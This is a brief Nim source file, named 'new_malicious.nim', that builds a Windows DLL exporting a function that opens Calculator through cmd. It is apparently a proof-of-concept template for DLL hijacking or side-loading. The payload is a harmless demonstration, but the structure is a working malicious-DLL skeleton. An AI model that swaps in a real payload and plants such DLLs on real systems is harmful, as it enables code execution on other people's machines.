import osproc

{.push dynlib exportc.}

proc popCalc*(): void {.stdcall, exportc, dynlib.} =
    let command = "/r" & " C:/windows/system32/calc.exe"
    discard execProcess("cmd", args=[command], options={poUsePath})

{.pop.}
# nim c -d=mingw --app=lib --cpu=amd64 new_malicious.nim 或者 nim c --app=lib new_malicious.nim